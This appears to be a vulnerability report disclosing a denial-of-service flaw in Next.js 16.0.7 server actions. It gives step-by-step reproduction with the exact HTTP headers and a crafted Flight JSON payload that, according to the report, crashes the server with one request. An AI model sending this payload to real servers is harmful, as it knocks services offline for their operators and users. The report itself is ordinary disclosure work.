## Title
DoS: Response/_formData confusion crash

## Description
Crafted `_response/_formData` fields in a Flight payload drive the decoder into unbounded processing in the webstreams pipeline, causing a stack overflow.

## Impact
High – single request crashes the server (stack overflow/health-down). Observed on Next.js 16.0.7 sample app (`/test`).

## Reproduction steps
1) Discover a current action ID (42-char hex starting with `40`).
2) POST the JSON body below with `Content-Type: text/plain;charset=UTF-8`, `Accept: text/x-component`, `Next-Action: <ACTION_ID>`:
   ```
   {
     "status": "pending",
     "reason": { "then": "$F1", "value": "$R0" },
     "value": "$L0",
     "_response": { "_chunks": "$Q1", "_formData": { "get": "$R0" }, "_prefix": "$F1" }
   }
   ```
3) Server process crashes (stack overflow seen in dev logs at `internal/webstreams/readablestream`); health probe fails.
